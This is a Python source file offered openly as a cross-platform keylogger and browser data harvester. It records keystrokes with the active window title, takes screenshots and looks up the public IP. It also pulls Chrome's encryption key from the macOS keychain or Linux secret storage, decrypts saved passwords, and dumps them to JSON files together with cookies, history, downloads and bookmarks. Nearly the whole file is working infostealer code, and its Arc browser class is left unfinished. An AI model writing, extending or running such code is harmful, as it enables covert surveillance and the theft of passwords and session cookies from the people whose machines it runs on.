"""
Advanced Keylogger with Browser Data Extraction for Mac, Windows, and Linux

This module implements a keylogger and browser credential harvester
with support for screenshots, system information gathering, and
encrypted data storage.
"""

import base64
import binascii
import json
import os
import platform
import re
import shutil
import socket
import sqlite3
import string
import subprocess
import tempfile
import time
import requests
import datetime

from importlib import import_module
from pathlib import Path

# Third-party imports
try:
    from PIL import ImageGrab
    from pynput.keyboard import Key, Listener
    from Crypto.Cipher import AES
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.fernet import Fernet
except ImportError:
    print("Required packages not installed. Trying to install...")
    print("pip install pillow pynput pycryptodomex cryptography")
    try:
        subprocess.run(["pip", "install", "pillow", "pynput", "pycryptodomex", "cryptography"])
        print("Packages installed successfully")
    except Exception as e:
        print(f"Failed to install packages: {e}")
        exit(1)

# Configuration constants
LOGGER_OUTPUT = "logger.txt"
COMPUTER_INFORMATION = "computer_information.txt"
SCREENSHOT_DIRECTORY = "screenshots"
SCREENSHOT_COUNT = 10
SCREENSHOT_INTERVAL = 10

# Generate encryption key for secure storage
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)


class KeyLogger:
    """
    Keylogger implementation with screenshot capabilities.
    
    This class handles keyboard event monitoring, active window
    tracking, and periodic screenshot capture.
    """
    
    def __init__(self, interval=0):
        """
        Initialize the keylogger with specified settings.
        
        Args:
            interval: Time between keylog uploads (if implemented)
        """
        self.LOGGER_OUTPUT = LOGGER_OUTPUT
        self.COMPUTER_INFORMATION = COMPUTER_INFORMATION
        self.SCREENSHOT_DIRECTORY = SCREENSHOT_DIRECTORY
        self.interval = interval
    
    def on_press(self, key):
        """
        Handle key press events and log them with the active window title.
        
        Args:
            key: The key that was pressed
        """
        current_window = self.get_active_window()

        # Format special keys for better readability
        with open(self.LOGGER_OUTPUT, "a") as f:
            key_str = key
            if key == Key.space:
                key_str = " "
            elif key == Key.enter:
                key_str = "\n" 
            elif key == Key.tab:
                key_str = "\t"
            
            # Log the key with the window title
            f.write(f"{current_window} - ({key_str})\n")

    def get_computer_information(self):
        """Collect and log system information"""
        with open(self.COMPUTER_INFORMATION, "a") as f:
            hostname = socket.gethostname()

            try:
                public_ip = requests.get("https://api.ipify.org?format=json").json()
                f.write(f'\nPublic IP: {public_ip["ip"]}\n')
            except:
                f.write(f'\nPublic IP: Could not be retrieved\n')
                
            f.write(f'Hostname: {hostname}\n')
            f.write(f'Operating System: {platform.system()} {platform.version()}\n')
            f.write(f'Processor: {platform.processor()}\n')

    def make_screenshot(self):
        """Capture and save a screenshot with timestamp"""
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = Path(__file__).parent.joinpath(
                self.SCREENSHOT_DIRECTORY, 
                f"{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_screenshot.png"
            )
            screenshot.save(screenshot_path)
        except Exception as e:
            print(f"Screenshot error: {e}")
    
    def run(self):
        """Main method to start the keylogger"""
        # Create screenshots directory if it doesn't exist
        if not os.path.exists(SCREENSHOT_DIRECTORY):
            os.mkdir(SCREENSHOT_DIRECTORY)
            
        self.get_computer_information()
        with Listener(on_press=self.on_press) as listener:
            self.take_screenshot()
            listener.join()

    def take_screenshot(self):
        """Take multiple screenshots at set intervals"""
        for i in range(SCREENSHOT_COUNT):
            self.make_screenshot()
            time.sleep(SCREENSHOT_INTERVAL)

    def get_active_window(self):
        """
        Get the title of the currently active window based on OS.
        
        Returns:
            str: The title of the active window
        """
        title = "Unknown Window"

        if platform.system() == "Windows":
            try:
                import win32gui
                title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if not title:
                    title = "Unknown Window"
            except ImportError:
                title = "Could not get window title (win32gui not available)"
        
        elif platform.system() == "Darwin":  # macOS
            try:
                result = subprocess.run(
                    ['osascript', '-e', 'tell application "System Events" to get name of first application process whose frontmost is true'], 
                    capture_output=True, 
                    text=True
                )
                if result.returncode == 0 and result.stdout.strip():
                    title = result.stdout.strip()
                else:
                    title = "Unknown Window"
            except Exception:
                title = "Could not get window title on macOS"
        
        else:  # Linux
            try:
                from Xlib import display
                d = display.Display()
                window = d.get_input_focus().focus
                window_name = window.get_name()
                d.close()
                
                if window_name:
                    title = window_name
            except Exception:
                title = "Could not get window title on Linux"
        
        return title


class BrowserBase:
    """Base class for browser data extraction"""
    
    def __init__(self):
        """Initialize the browser base class"""
        self.system = platform.system()
        self.temp_dir = tempfile.mkdtemp()
        self.user_home = os.path.expanduser("~")
        self.dbpath = None
        self.results = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'downloads': [],
            'credit_cards': [],
        }
    
    def _copy_db_file(self, source_file):
        """
        Create a temporary copy of the database file.
        
        Args:
            source_file: Path to the source database file
            
        Returns:
            str: Path to the temporary copy, or None if failed
        """
        if not os.path.exists(source_file):
            print(f"Source file not found: {source_file}")
            return None
            
        temp_file = os.path.join(self.temp_dir, f"temp_{os.path.basename(source_file)}")
        try:
            shutil.copy2(source_file, temp_file)
            return temp_file
        except Exception as e:
            print(f"Failed to copy {source_file}: {e}")
            return None
    
    def get_browser_paths(self):
        """To be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement get_browser_paths()")
    
    def get_passwords(self):
        """To be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement get_passwords()")
    
    def get_history(self):
        """To be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement get_history()")
        
    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.temp_dir)
        except Exception as e:
            print(f"Error cleaning up temporary directory: {e}")


class ChromeBrowser(BrowserBase):
    """Chrome browser data extraction class"""
    
    def __init__(self):
        """Initialize Chrome browser data harvester"""
        super().__init__()
        self.passwords = {'data': []}
        self.history = {'data': []}
        self.bookmarks = {'data': []}
        self.downloads = {'data': []}
        self.cookies = {'data': []}
        
        # Initialize based on the operating system
        if self.system == "Darwin":
            self._mac_chrome_init()
        elif self.system == "Windows":
            self._win_chrome_init()
        elif self.system == "Linux":
            self._linux_chrome_init()
    
    def get_browser_paths(self):
        """
        Get paths to Chrome data directories based on the operating system.
        
        Returns:
            list: List of tuples containing (path, browser_name)
        """
        browser_paths = []
        
        if self.system == "Windows":
            local_appdata = os.getenv('LOCALAPPDATA')
            browser_paths = [
                (os.path.join(local_appdata, 'Google', 'Chrome', 'User Data'), 'chrome'),
            ]

        elif self.system == "Darwin":  # macOS
            home = os.path.expanduser('~')
            browser_paths = [
                (os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', "User Data"), 'chrome'),
            ]

        elif self.system == "Linux":
            home = os.path.expanduser('~')
            browser_paths = [
                (os.path.join(home, '.config', 'google-chrome'), 'chrome'),
            ]
            
        # Filter to only existing paths
        return [(path, name) for path, name in browser_paths if os.path.exists(path)]
    
    def _mac_chrome_init(self):
        """Initialize the encryption key for Chrome on macOS"""
        # Try different possible keychain entry names for Chrome
        keychain_entries = [
            "Chrome",
            "Chrome Safe Storage",
            "'Chrome Safe Storage'",
            "Chromium",
            "Chromium Safe Storage"
        ]
        
        secret_pass_key = None
        for entry in keychain_entries:
            try:
                # Try to get the password from keychain
                cmd = f"security find-generic-password -wa {entry}"
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True
                )
                stdout, _ = process.communicate()
                
                if process.returncode == 0 and stdout:
                    secret_pass_key = stdout.replace(b'\n', b'')
                    break
            except Exception as e:
                pass
        
        if not secret_pass_key:
            secret_pass_key = b'peanuts'
        
        # Chrome uses these values for key derivation
        iterations = 1003
        salt = b'saltysalt'
        length = 16

        # Derive the actual key
        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(secret_pass_key, salt, length, iterations)
        
        # Adjust Chrome paths for macOS - this is a common path structure
        user_home = os.path.expanduser("~")
        chrome_path = os.path.join(user_home, "Library", "Application Support", "Google", "Chrome")
        default_path = os.path.join(chrome_path, "Default")
        
        # Check if the Default directory exists, otherwise try to find profiles
        if os.path.exists(default_path):
            self.dbpath = default_path
        else:
            # Try to find any Chrome profiles
            if os.path.exists(chrome_path):
                profiles = [d for d in os.listdir(chrome_path) if os.path.isdir(os.path.join(chrome_path, d))]
                if profiles:
                    self.dbpath = os.path.join(chrome_path, profiles[0])
                else:
                    return
            else:
                return
        
        # Set up database paths
        self.login_data_db = os.path.join(self.dbpath, "Login Data")
        self.history_db = os.path.join(self.dbpath, "History")
        self.cookies_db = os.path.join(self.dbpath, "Cookies")
        self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")
        
        # Verify that the database files exist
        print(f"Login Data path: {self.login_data_db} (exists: {os.path.exists(self.login_data_db)})")
        print(f"History path: {self.history_db} (exists: {os.path.exists(self.history_db)})")

    def _win_chrome_init(self):
        """Initialize Chrome database paths on Windows"""
        browser_paths = self.get_browser_paths()

        if not browser_paths:
            print("No Chrome browser paths found")
            return
        
        base_path = browser_paths[0][0]
        self.dbpath = os.path.join(base_path, "Default")
        self.login_data_db = os.path.join(self.dbpath, "Login Data")
        self.history_db = os.path.join(self.dbpath, "History")
        self.cookies_db = os.path.join(self.dbpath, "Cookies")
        self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")

        if not os.path.exists(self.dbpath):
            print(f"Database path does not exist: {self.dbpath}")
    
    def _linux_chrome_init(self):
        """Initialize the encryption key for Chrome on Linux"""
        try:
            # On Linux, Chrome typically uses a simple encryption with a hardcoded key
            # Fallback to a known value if we can't import the required modules
            secret_pass_key = b'peanuts'
            
            # Try to get the actual key from the secret service if available
            try:
                import secretstorage
                bus = secretstorage.dbus_init()
                collection = secretstorage.get_default_collection(bus)
                for item in collection.get_all_items():
                    if item.get_label() == 'Chrome Safe Storage':
                        secret_pass_key = item.get_secret()
                        print("Successfully found Chrome key from secret storage")
                        break
            except ImportError:
                print("secretstorage module not available, using fallback key")
            except Exception as e:
                print(f"Error retrieving Chrome key from secretstorage: {e}")
            
            # Chrome on Linux uses these values for key derivation
            iterations = 1
            salt = b'saltysalt'
            length = 16

            # Derive the actual key
            kdf = import_module('Crypto.Protocol.KDF')
            self.key = kdf.PBKDF2(secret_pass_key, salt, length, iterations)
            
            # Get browser paths for Linux
            browser_paths = self.get_browser_paths()
            if not browser_paths:
                print("No Chrome browser paths found")
                return
                
            base_path = browser_paths[0][0]
            # Chrome on Linux typically has the Default profile here
            self.dbpath = os.path.join(base_path, "Default")
            if not os.path.exists(self.dbpath):
                self.dbpath = base_path  # Some Linux installations might not have "Default"
                
            # Set database paths
            self.login_data_db = os.path.join(self.dbpath, "Login Data")
            self.history_db = os.path.join(self.dbpath, "History")
            self.cookies_db = os.path.join(self.dbpath, "Cookies")
            self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")
            print(f"Chrome database path on Linux: {self.dbpath}")
            
        except Exception as e:
            print(f"Error initializing Chrome on Linux: {e}")
    
    def _chrome_decrypt_mac(self, encrypted_data):
        """
        Decrypt Chrome password data on macOS.
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if not encrypted_data:
            return ""
            
        try:
            # Handle different encryption formats
            if len(encrypted_data) > 3 and encrypted_data[:3] in (b'v10', b'v11'):
                # Chrome v80+ uses AES-GCM
                nonce = encrypted_data[3:15]
                ciphertext = encrypted_data[15:]
                
                try:
                    aesgcm = AESGCM(self.key)
                    decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                    return decrypted.decode('utf-8', errors='replace')
                except Exception as e:
                    print(f"AES-GCM decryption failed: {e}")
            
            # For older Chrome versions or as fallback
            aes = import_module('Crypto.Cipher.AES')
            i_vector = b' ' * 16
            enc_passwd = encrypted_data[3:] if len(encrypted_data) > 3 else encrypted_data
            cipher = aes.new(self.key, aes.MODE_CBC, IV=i_vector)
            decrypted = cipher.decrypt(enc_passwd)
            return decrypted.strip().decode('utf8', errors='replace')
            
        except Exception as e:
            print(f"Mac decryption error: {e}")
            return ""
    
    def _chrome_decrypt_win(self, encrypted_data):
        """
        Decrypt Chrome password data on Windows.
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if not encrypted_data:
            return ""
        
        try:
            import win32crypt
            data = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)
            return data[1].decode('utf8')
        except Exception as e:
            print(f"Windows decryption error: {e}")
            return ""
    
    def _chrome_decrypt_linux(self, encrypted_data):
        """
        Decrypt Chrome password data on Linux.
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if not encrypted_data:
            return ""
            
        try:
            # Handle different encryption formats (similar to macOS)
            if len(encrypted_data) > 3 and encrypted_data[:3] in (b'v10', b'v11'):
                # Chrome v80+ uses AES-GCM
                nonce = encrypted_data[3:15]
                ciphertext = encrypted_data[15:]
                
                try:
                    aesgcm = AESGCM(self.key)
                    decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                    return decrypted.decode('utf-8', errors='replace')
                except Exception as e:
                    print(f"AES-GCM decryption failed: {e}")
            
            # For older Chrome versions or as fallback
            aes = import_module('Crypto.Cipher.AES')
            i_vector = b' ' * 16
            enc_passwd = encrypted_data[3:] if len(encrypted_data) > 3 else encrypted_data
            cipher = aes.new(self.key, aes.MODE_CBC, IV=i_vector)
            decrypted = cipher.decrypt(enc_passwd)
            return decrypted.strip().decode('utf8', errors='replace')
            
        except Exception as e:
            print(f"Linux decryption error: {e}")
            return ""
    
    def decrypt_password(self, encrypted_data):
        """
        Decrypt password using the appropriate method for the current OS
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if self.system == "Windows":
            return self._chrome_decrypt_win(encrypted_data)
        elif self.system == "Linux":
            return self._chrome_decrypt_linux(encrypted_data)
        else:  # Darwin/macOS
            return self._chrome_decrypt_mac(encrypted_data)
    
    def get_passwords(self):
        """
        Extract passwords from Chrome's Login Data database.
        
        Returns:
            dict: Dictionary containing the extracted password data
        """
        if not hasattr(self, 'login_data_db') or not self.login_data_db:
            print("Login database path not initialized")
            return {'data': []}
            
        try:
            # Copy the database to a temporary file
            temp_db = self._copy_db_file(self.login_data_db)
            if not temp_db:
                return {'data': []}
                
            # Connect to the database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Check if logins table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
            if not cursor.fetchone():
                print("No logins table found in database")
                return {'data': []}
            
            # Extract the data
            cursor.execute("""
                SELECT action_url, username_value, password_value
                FROM logins
            """)
            
            data = {'data': []}
            for result in cursor.fetchall():
                try:
                    if result[2]:
                        password = self.decrypt_password(result[2])
                        password = ''.join(c for c in password if c in string.printable)
                        
                        if result[1] or password:  # Only add if username or password exists
                            entry = {
                                'url': result[0],
                                'username': result[1],
                                'password': password
                            }
                            data['data'].append(entry)
                except Exception as e:
                    print(f"Error decrypting password: {e}")
            
            conn.close()
            self.passwords = data
            print(f"Found {len(data['data'])} Chrome passwords")
            return data
            
        except Exception as e:
            print(f"Error processing Chrome database: {e}")
            return {'data': []}
        finally:
            # Clean up
            if 'temp_db' in locals() and os.path.exists(temp_db):
                try:
                    os.unlink(temp_db)
                except:
                    pass
    
    def get_history(self):
        """
        Extract browsing history from Chrome's History database.
        
        Returns:
            dict: Dictionary containing the extracted history data
        """
        if not hasattr(self, 'history_db') or not self.history_db:
            return {'data': []}
        
        if not os.path.exists(self.history_db):
            return {'data': []}
            
        try:
            # Copy the database to a temporary file
            temp_db = self._copy_db_file(self.history_db)
            if not temp_db:
                return {'data': []}
                
            # Connect to the database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Check if urls table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='urls'")
            if not cursor.fetchone():
                return {'data': []}
            
            # Extract the data
            cursor.execute("""
                SELECT urls.url, urls.title, urls.visit_count, 
                       urls.last_visit_time, visits.visit_time 
                FROM urls LEFT JOIN visits ON urls.id = visits.url
                ORDER BY urls.last_visit_time DESC
                LIMIT 100
            """)
            
            data = {'data': []}
            for result in cursor.fetchall():
                try:
                    url, title, visit_count, last_visit_time, visit_time = result
                    
                    # Convert Chrome timestamp (microseconds since Jan 1, 1601) to readable format
                    if last_visit_time:
                        chrome_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit_time)
                        last_visit_time = chrome_time.strftime('%Y-%m-%d %H:%M:%S')
                    
                    entry = {
                        'url': url,
                        'title': title,
                        'visit_count': visit_count,
                        'last_visit_time': last_visit_time
                    }
                    data['data'].append(entry)
                except Exception:
                    pass
            
            conn.close()
            self.history = data
            return data
            
        except Exception as e:
            return {'data': []}
        finally:
            # Clean up
            if 'temp_db' in locals() and os.path.exists(temp_db):
                try:
                    os.unlink(temp_db)
                except:
                    pass
    
    def get_bookmarks(self):
        """
        Extract bookmarks from Chrome's Bookmarks file.
        
        Returns:
            dict: Dictionary containing the extracted bookmarks data
        """
        if not hasattr(self, 'bookmarks_file') or not self.bookmarks_file:
            return {'data': []}
        
        if not os.path.exists(self.bookmarks_file):
            return {'data': []}
        
        try:
            with open(self.bookmarks_file, 'r', encoding='utf-8') as f:
                bookmarks_json = json.load(f)
            
            data = {'data': []}
            
            # Process bookmark roots (typically "bookmark_bar", "other", "synced")
            roots = bookmarks_json.get('roots', {})
            
            for root_name, root in roots.items():
                self._process_bookmark_node(root, data['data'], folder_path=root_name)
            
            self.bookmarks = data
            return data
            
        except Exception as e:
            return {'data': []}
    
    def _process_bookmark_node(self, node, result_list, folder_path=""):
        """
        Recursively process bookmark nodes and extract bookmark data.
        
        Args:
            node: Current bookmark node to process
            result_list: List to append bookmark entries to
            folder_path: Current folder path string
        """
        # Process a URL bookmark
        if node.get('type') == 'url':
            name = node.get('name', '')
            url = node.get('url', '')
            added = node.get('date_added', '')
            
            # Convert Chrome timestamp if available
            if added:
                try:
                    chrome_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=int(added))
                    added = chrome_time.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    added = ""
            
            # Add bookmark to results
            entry = {
                'url': url,
                'name': name,
                'folder': folder_path,
                'date_added': added
            }
            result_list.append(entry)
        
        # Process a folder (which may contain more bookmarks)
        elif node.get('type') == 'folder':
            folder_name = node.get('name', '')
            new_path = f"{folder_path}/{folder_name}" if folder_path else folder_name
            
            # Process all children in this folder
            for child in node.get('children', []):
                self._process_bookmark_node(child, result_list, folder_path=new_path)

    def get_downloads(self):
        """
        Extract download history from Chrome's History database.
        
        Returns:
            dict: Dictionary containing the extracted download data
        """
        if not hasattr(self, 'history_db') or not self.history_db:
            return {'data': []}
        
        if not os.path.exists(self.history_db):
            return {'data': []}
        
        try:
            # Copy the database to a temporary file
            temp_history = self._copy_db_file(self.history_db)
            if not temp_history:
                return {'data': []}
            
            # Connect to the database
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            
            # Step 1: Determine the schema of the downloads table
            cursor.execute("PRAGMA table_info(downloads)")
            columns = cursor.fetchall()
            column_names = [col[1] for col in columns]
            
            # Step 2: Build a query based on the actual schema
            select_fields = []
            if 'target_path' in column_names:
                select_fields.append('downloads.target_path')
            else:
                select_fields.append("'' AS target_path")
                
            if 'tab_url' in column_names:
                select_fields.append('downloads.tab_url')
            else:
                select_fields.append("'' AS tab_url")
            
            if 'referrer' in column_names:
                select_fields.append('downloads.referrer')
            else:
                select_fields.append("'' AS referrer")
            
            if 'start_time' in column_names:
                select_fields.append('downloads.start_time')
            else:
                select_fields.append("0 AS start_time")
            
            if 'end_time' in column_names:
                select_fields.append('downloads.end_time')
            else:
                select_fields.append("0 AS end_time")
            
            if 'total_bytes' in column_names:
                select_fields.append('downloads.total_bytes')
            else:
                select_fields.append("0 AS total_bytes")
            
            if 'state' in column_names:
                select_fields.append('downloads.state')
            else:
                select_fields.append("0 AS state")
            
            # Check if downloads_url_chains table exists
            has_url_chains = False
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='downloads_url_chains'")
            if cursor.fetchone():
                has_url_chains = True
            
            query = f"""
                SELECT
                    {', '.join(select_fields)}
                    {', downloads_url_chains.url' if has_url_chains else ", '' AS url"}
                FROM
                    downloads
                {f'LEFT JOIN downloads_url_chains ON downloads.id = downloads_url_chains.id' if has_url_chains else ''}
                ORDER BY
                    downloads.start_time DESC
                LIMIT 100
            """
            
            cursor.execute(query)
            
            results = cursor.fetchall()
            
            data = {'data': []}
            for result in results:
                try:
                    # Adjust unpacking based on the number of fields returned
                    if has_url_chains:
                        target_path, tab_url, referrer, start_time, end_time, total_bytes, state, chain_url = result
                    else:
                        target_path, tab_url, referrer, start_time, end_time, total_bytes, state = result
                        chain_url = ""
                    
                    # Convert Chrome timestamps to readable format
                    start_time_str = ""
                    end_time_str = ""
                    
                    if start_time:
                        try:
                            start_time_date = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=start_time)
                            start_time_str = start_time_date.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            pass
                    
                    if end_time:
                        try:
                            end_time_date = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=end_time)
                            end_time_str = end_time_date.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            pass
                    
                    # Format file size
                    size_str = ""
                    if total_bytes:
                        try:
                            # Convert to MB with 2 decimal places
                            if total_bytes > 1024 * 1024:
                                size_str = f"{total_bytes / (1024 * 1024):.2f} MB"
                            # Convert to KB with 2 decimal places
                            elif total_bytes > 1024:
                                size_str = f"{total_bytes / 1024:.2f} KB"
                            else:
                                size_str = f"{total_bytes} bytes"
                        except:
                            size_str = str(total_bytes) + " bytes"
                    
                    # Get filename from target path
                    filename = os.path.basename(target_path) if target_path else ""
                    
                    # Map download state to readable format
                    state_map = {
                        0: "In Progress",
                        1: "Complete",
                        2: "Cancelled",
                        3: "Interrupted",
                        4: "Interrupted"
                    }
                    status = state_map.get(state, "Unknown")
                    
                    entry = {
                        'filename': filename,
                        'target_path': target_path,
                        'url': chain_url or tab_url or referrer,
                        'start_time': start_time_str,
                        'end_time': end_time_str,
                        'size': size_str,
                        'status': status
                    }
                    data['data'].append(entry)
                except Exception:
                    pass
            
            conn.close()
            self.downloads = data
            return data
            
        except Exception:
            return {'data': []}
        finally:
            # Clean up
            if 'temp_history' in locals() and os.path.exists(temp_history):
                try:
                    os.unlink(temp_history)
                except:
                    pass

    def get_cookies(self):
        """
        Extract cookies from Chrome's Cookies database.
        
        Returns:
            dict: Dictionary containing the extracted cookie data
        """
        if not hasattr(self, 'cookies_db') or not self.cookies_db:
            return {'data': []}
        
        if not os.path.exists(self.cookies_db):
            return {'data': []}
        
        try:
            temp_cookies = self._copy_db_file(self.cookies_db)
            if not temp_cookies:
                return {'data': []}
            
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            
            # Check if cookies table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
            if not cursor.fetchone():
                return {'data': []}
            
            # Determine schema of cookies table
            cursor.execute("PRAGMA table_info(cookies)")
            columns = cursor.fetchall()
            column_names = [col[1] for col in columns]
            
            # Build query based on available columns
            select_fields = []
            for field in ['host_key', 'name', 'path', 'value', 'creation_utc', 
                         'expires_utc', 'last_access_utc', 'is_secure', 'is_httponly']:
                if field in column_names:
                    select_fields.append(f'cookies.{field}')
                else:
                    # Default value if column doesn't exist
                    if field in ['is_secure', 'is_httponly']:
                        select_fields.append('0')
                    elif field in ['creation_utc', 'expires_utc', 'last_access_utc']:
                        select_fields.append('0')
                    else:
                        select_fields.append("''")
            
            query = f"""
                SELECT {', '.join(select_fields)}
                FROM cookies
                ORDER BY host_key
                LIMIT 500
            """
            
            cursor.execute(query)
            
            results = cursor.fetchall()
            data = {'data': []}
            
            for row in results:
                try:
                    # Unpack all fields
                    host, name, path, value, creation, expires, last_access, secure, httponly = row
                    
                    # Convert timestamps
                    if creation:
                        try:
                            creation_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=creation)
                            creation_time = creation_time.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            creation_time = ""
                    else:
                        creation_time = ""
                    
                    if expires:
                        try:
                            expiration_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=expires)
                            expiration_time = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            expiration_time = ""
                    else:
                        expiration_time = ""
                    
                    if last_access:
                        try:
                            access_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_access)
                            access_time = access_time.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            access_time = ""
                    else:
                        access_time = ""
                        
                    entry = {
                        'host': host,
                        'name': name,
                        'path': path,
                        'value': value,
                        'creation_time': creation_time,
                        'expiration_time': expiration_time,
                        'access_time': access_time,
                        'secure': bool(secure),
                        'httponly': bool(httponly)
                    }
                    data['data'].append(entry)
                except Exception:
                    pass
                
            conn.close()
            self.cookies = data
            return data
        
        except Exception:
            return {'data': []}
        finally:
            # Clean up
            if 'temp_cookies' in locals() and os.path.exists(temp_cookies):
                try:
                    os.unlink(temp_cookies)
                except:
                    pass
    
    def harvest_data(self):
        """
        Harvest all available data from Chrome.
        
        Returns:
            dict: Dictionary containing all the extracted data
        """
        self.get_passwords()
        self.get_history()
        self.get_bookmarks()
        self.get_downloads()
        self.get_cookies()
        
        return {
            'passwords': self.passwords,
            'history': self.history,
            'bookmarks': self.bookmarks,
            'downloads': self.downloads,
            'cookies': self.cookies
        }
    
class ArcBrowser(BrowserBase):
    """
    Extract saved credentials from Arc browser.
    """
    def __init__(self):
        super().__init__()
        self.passwords = {'data': []}
        self.history = {'data': []}
        self.bookmarks = {'data': []}
        self.downloads = {'data': []}
        self.cookies = {'data': []}        
    
    def get_browser_paths(self):
        """
        Get the paths to the browser databases.
        """

        browser_paths = []
        
        if self.system == "Windows":
            local_appdata = os.getenv('LOCALAPPDATA')
            browser_paths = [
                (os.path.join(local_appdata, "Arc", "User Data", "Default", "Local Storage", "leveldb"), 'arc'),
            ]

        elif self.system == "Darwin":  # macOS
            home = os.path.expanduser('~')
            browser_paths = [
                (os.path.join(home, 'Library', 'Application Support', 'Arc', "User Data", "Default", "Local Storage", "leveldb"), 'arc'),
            ]

        elif self.system == "Linux":
            home = os.path.expanduser('~')
            browser_paths = [
                os.path.join(home, ".config", "Arc", "Local Storage", "leveldb"),
            ]
            
        # Filter to only existing paths
        return [(path, name) for path, name in browser_paths if os.path.exists(path)]

        
            
        
        


class BrowserDataHarvester:
    """
    Extract saved credentials from common web browsers.
    
    Supports Chrome, Firefox, Edge, and Brave across multiple platforms.
    """
    
    def __init__(self):
        """Initialize the browser data harvester"""
        self.system = platform.system()
        self.temp_dir = tempfile.mkdtemp()
        self.results = {
            'passwords': {'data': []},
            'history': {'data': []},
            'cookies': {'data': []},
            'downloads': {'data': []},
            'credit_cards': {'data': []},
            'bookmarks': {'data': []},
        }
        self.browser_instances = {}
        
        # Initialize browser extractors
        try:
            self.browser_instances['chrome'] = ChromeBrowser()
            # Add more browsers here as they're implemented
            # self.browser_instances['firefox'] = FirefoxBrowser()
            # self.browser_instances['edge'] = EdgeBrowser()
        except Exception as e:
            print(f"Error initializing browser instances: {e}")
    
    def harvest_browser_data(self, browser_name=None):
        """
        Harvest data from specified browser or all available browsers.
        
        Args:
            browser_name: Optional name of browser to harvest from
            
        Returns:
            dict: Combined results from all harvested browsers
        """
        if browser_name and browser_name in self.browser_instances:
            # Harvest from specific browser
            browser = self.browser_instances[browser_name]
            browser_data = browser.harvest_data()
            self.results['passwords'] = browser_data['passwords']
            self.results['history'] = browser_data['history']
            self.results['bookmarks'] = browser_data.get('bookmarks', {'data': []})
            self.results['downloads'] = browser_data.get('downloads', {'data': []})
            self.results['cookies'] = browser_data.get('cookies', {'data': []})
            return self.results
            
        else:
            # Harvest from all available browsers
            for name, browser in self.browser_instances.items():
                browser_data = browser.harvest_data()
                
                # Merge results
                if browser_data.get('passwords', {}).get('data'):
                    self.results['passwords'] = browser_data['passwords']
                    
                if browser_data.get('history', {}).get('data'):
                    self.results['history'] = browser_data['history']
                
                if browser_data.get('bookmarks', {}).get('data'):
                    self.results['bookmarks'] = browser_data['bookmarks']
                
                if browser_data.get('downloads', {}).get('data'):
                    self.results['downloads'] = browser_data['downloads']
                
                if browser_data.get('cookies', {}).get('data'):
                    self.results['cookies'] = browser_data['cookies']
                    
            return self.results
    
    def cleanup(self):
        """Clean up temporary files and resources"""
        try:
            shutil.rmtree(self.temp_dir)
            for browser in self.browser_instances.values():
                browser.cleanup()
        except Exception as e:
            print(f"Error during cleanup: {e}")


def main():
    """Main function to run the keylogger and browser data harvester"""
    # Extract browser data
    browser_harvester = BrowserDataHarvester()
    browser_data = browser_harvester.harvest_browser_data()
    
    # Save the results to files
    with open('browser_passwords.json', 'w') as f:
        json.dump(browser_data['passwords'], f, indent=4)

    with open('browser_history.json', 'w') as f:
        json.dump(browser_data['history'], f, indent=4)
    
    with open('browser_bookmarks.json', 'w') as f:
        json.dump(browser_data['bookmarks'], f, indent=4)
    
    with open('browser_downloads.json', 'w') as f:
        json.dump(browser_data['downloads'], f, indent=4)

    with open('browser_cookies.json', 'w') as f:
        json.dump(browser_data['cookies'], f, indent=4)
    
    # Clean up
    browser_harvester.cleanup()


if __name__ == "__main__":
    main()
                

